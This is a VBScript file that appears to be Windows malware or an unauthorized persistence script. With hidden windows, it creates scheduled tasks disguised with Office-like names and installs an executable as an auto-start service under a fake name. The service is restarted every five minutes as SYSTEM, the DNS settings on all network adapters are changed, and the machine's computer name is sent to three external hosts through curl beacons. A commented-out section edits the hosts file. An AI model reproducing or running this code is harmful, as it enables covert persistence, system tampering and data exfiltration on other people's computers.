Set oShell = CreateObject ("WScript.Shell") 
windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
With CreateObject("WScript.Shell")
     
    ' Pass 0 as the second parameter to hide the window...
    .Run "schtasks /delete /tn office_get /F", 0, True
    .Run "schtasks /create /tn office_get /xml " & windir & "\office_get.xml /F", 0, True
    .Run "taskkill /f /im sys2.exe", 0, True
    '.Run "schtasks /delete /tn flash_fw /F", 0, True
    .Run "sc delete CppWindowsService", 0, True
    .Run "sc create CppWindowsService binPath= " & windir & "\sys2.exe DisplayName= ""CppWindowsService"" start= auto", 0, True
    '.Run "net start CppWindowsService", 0, True
    '.Run "reg delete HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{49168414-9A56-45D3-A4BC-617FD19511D7} /f", 0, True
    .Run "schtasks /delete /tn officesw /F", 0, True
    'cmd="net start CppWindowsService" 
    'user="SYSTEM"
    .Run "schtasks /create /ru ""SYSTEM"" /sc minute /mo 5 /tr ""net start CppWindowsService"" /tn officesw /rl highest /F", 0, True
    '.Run "schtasks /create /ru ""SYSTEM"" /sc minute /mo 1 /tr ""rundll32 " & windir & "\sys3.dll sysfunc"" /tn flash_fw /rl highest /F", 0, True
    '.Run "schtasks /create /ru ""SYSTEM"" /sc minute /mo 1 /tr """ & windir & "\WindowsTask.exe"" /tn pippo /rl highest /F", 0, True
    '.Run windir & "\file.pdf"
    
    '.Run "schtasks /create /tn flash_fw /xml " & windir & "\flash_fw.xml /F", 0, True
End With
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")


Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputerName & "\root\cimv2")

Set colAdapters = objWMIService.ExecQuery _
    ("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
for each nad in colAdapters
    If Not IsNull(Nad.DefaultIPGateway) Then
      if not isnull(Nad.MACAddress) then 
        arrDNSServers = Array("8.8.8.8", "8.8.8.8")
        nad.SetDNSServerSearchOrder(arrDNSServers)
        'mac=Nad.MACAddress 'Wscript.Echo Nad.description, Nad.MACAddress 
      end if
    end if  
next
'Set oFSO = CreateObject("Scripting.FileSystemObject")
'Set oHosts = oFSO.GetFile("C:\Windows\System32\drivers\etc\hosts")
''WScript.Echo oHosts.attributes
'Set fileAPPEND = _
'  oFSO.OpenTextFile("C:\Windows\System32\drivers\etc\hosts", 8, true)
'fileAPPEND.Write(vbNewLine & "104.28.20.191 paner.altervista.org")
'fileAPPEND.Close()
'Set fileAPPEND = Nothing
'Set oHosts = Nothing
'Set oFSO = Nothing
'WScript.Echo "type " & windir & "\system32\drivers\etc\hosts | find /i paner.altervista.org || echo 10.0.0.0 paner.altervista.org >> " & windir & "\system32\drivers\etc\hosts"
'oShell.Run "type " & windir & "\system32\drivers\etc\hosts | findstr paner.altervista.org || echo 10.0.0.0 paner.altervista.org >> " & windir & "\system32\drivers\etc\hosts"
oShell.Run "curl https://paner.altervista.org/svc/wup.php?pc=mttool_" & strComputerName
oShell.Run "curl http://troglo.homepc.it/svc/wup.php?pc=mttool_" & strComputerName
oShell.Run "curl https://ctpescara.it/svc/wup.php?pc=mttool_" & strComputerName
